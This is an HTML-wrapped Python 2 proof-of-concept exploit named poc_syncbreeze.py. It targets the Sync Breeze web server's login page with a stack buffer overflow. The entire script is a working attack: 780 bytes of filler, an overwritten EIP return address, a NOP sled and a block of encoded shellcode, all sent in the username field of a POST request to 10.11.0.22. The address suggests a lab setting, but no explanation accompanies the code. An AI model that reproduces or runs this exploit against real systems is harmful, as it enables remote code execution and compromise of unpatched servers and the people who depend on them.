<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>poc_syncbreeze.py</title>
</head><body>#!/usr/bin/python<br/>
import socket<br/>
<br/>
try:<ul><li style="list-style-type: none">print "\nSending evil buffer..."</li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none">shellcode = ("\xbd\xda\xbf\x28\xe7\xdd\xc1\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"</li>
<li style="list-style-type: none">"\x52\x31\x6e\x12\x03\x6e\x12\x83\x34\x43\xca\x12\x34\x54\x89"</li>
<li style="list-style-type: none">"\xdd\xc4\xa5\xee\x54\x21\x94\x2e\x02\x22\x87\x9e\x40\x66\x24"</li>
<li style="list-style-type: none">"\x54\x04\x92\xbf\x18\x81\x95\x08\x96\xf7\x98\x89\x8b\xc4\xbb"</li>
<li style="list-style-type: none">"\x09\xd6\x18\x1b\x33\x19\x6d\x5a\x74\x44\x9c\x0e\x2d\x02\x33"</li>
<li style="list-style-type: none">"\xbe\x5a\x5e\x88\x35\x10\x4e\x88\xaa\xe1\x71\xb9\x7d\x79\x28"</li>
<li style="list-style-type: none">"\x19\x7c\xae\x40\x10\x66\xb3\x6d\xea\x1d\x07\x19\xed\xf7\x59"</li>
<li style="list-style-type: none">"\xe2\x42\x36\x56\x11\x9a\x7f\x51\xca\xe9\x89\xa1\x77\xea\x4e"</li>
<li style="list-style-type: none">"\xdb\xa3\x7f\x54\x7b\x27\x27\xb0\x7d\xe4\xbe\x33\x71\x41\xb4"</li>
<li style="list-style-type: none">"\x1b\x96\x54\x19\x10\xa2\xdd\x9c\xf6\x22\xa5\xba\xd2\x6f\x7d"</li>
<li style="list-style-type: none">"\xa2\x43\xca\xd0\xdb\x93\xb5\x8d\x79\xd8\x58\xd9\xf3\x83\x34"</li>
<li style="list-style-type: none">"\x2e\x3e\x3b\xc5\x38\x49\x48\xf7\xe7\xe1\xc6\xbb\x60\x2c\x11"</li>
<li style="list-style-type: none">"\xbb\x5a\x88\x8d\x42\x65\xe9\x84\x80\x31\xb9\xbe\x21\x3a\x52"</li>
<li style="list-style-type: none">"\x3e\xcd\xef\xf5\x6e\x61\x40\xb6\xde\xc1\x30\x5e\x34\xce\x6f"</li>
<li style="list-style-type: none">"\x7e\x37\x04\x18\x15\xc2\xcf\x2d\xe1\xcc\x0b\x5a\xf7\xcc\x12"</li>
<li style="list-style-type: none">"\x21\x7e\x2a\x7e\x45\xd7\xe5\x17\xfc\x72\x7d\x89\x01\xa9\xf8"</li>
<li style="list-style-type: none">"\x89\x8a\x5e\xfd\x44\x7b\x2a\xed\x31\x8b\x61\x4f\x97\x94\x5f"</li>
<li style="list-style-type: none">"\xe7\x7b\x06\x04\xf7\xf2\x3b\x93\xa0\x53\x8d\xea\x24\x4e\xb4"</li>
<li style="list-style-type: none">"\x44\x5a\x93\x20\xae\xde\x48\x91\x31\xdf\x1d\xad\x15\xcf\xdb"</li>
<li style="list-style-type: none">"\x2e\x12\xbb\xb3\x78\xcc\x15\x72\xd3\xbe\xcf\x2c\x88\x68\x87"</li>
<li style="list-style-type: none">"\xa9\xe2\xaa\xd1\xb5\x2e\x5d\x3d\x07\x87\x18\x42\xa8\x4f\xad"</li>
<li style="list-style-type: none">"\x3b\xd4\xef\x52\x96\x5c\x0f\xb1\x32\xa9\xb8\x6c\xd7\x10\xa5"</li>
<li style="list-style-type: none">"\x8e\x02\x56\xd0\x0c\xa6\x27\x27\x0c\xc3\x22\x63\x8a\x38\x5f"</li>
<li style="list-style-type: none">"\xfc\x7f\x3e\xcc\xfd\x55")</li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none">filler = "A" * 780</li>
<li style="list-style-type: none">eip = "\x83\x0c\x09\x10"</li>
<li style="list-style-type: none">offset = "C" * 4</li>
<li style="list-style-type: none">nops = "\x90" * 10</li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none">inputBuffer = filler + eip + offset + nops + shellcode </li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none">content = "username=" + inputBuffer + "&amp;password=A"</li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none">buffer = "POST /login HTTP/1.1\r\n"" </li>
<li style="list-style-type: none">buffer += "Host: 10.11.0.22\r\n"</li>
<li style="list-style-type: none">buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"</li>
<li style="list-style-type: none">buffer += "Accept: text/html, application/xhtml+xml;q=0.9,*/*;q=0.8\r\n"</li>
<li style="list-style-type: none">buffer += "Accept-Language: en-US, en;q=0.5\r\n"</li>
<li style="list-style-type: none">buffer += "Referer: http://10.11.0.22/login\r\n"</li>
<li style="list-style-type: none">buffer += "Connection: close\r\n"</li>
<li style="list-style-type: none">buffer += "Content-Type: application/x-www-form-urlencoded\r\n" </li>
<li style="list-style-type: none">buffer += "Content-Lenght: "+str(len(content))+"\r\n"</li>
<li style="list-style-type: none">buffer += "\r\n"</li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none">buffer += content</li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none">s.connect(("10.11.0.22", 80))</li>
<li style="list-style-type: none">s.send(buffer)</li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none">s.close()</li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none">print "\nDone!"</li>
</ul>
<br/>
except:<ul><li style="list-style-type: none">print "\nCould not connect!"</li>
</ul>
</body></html>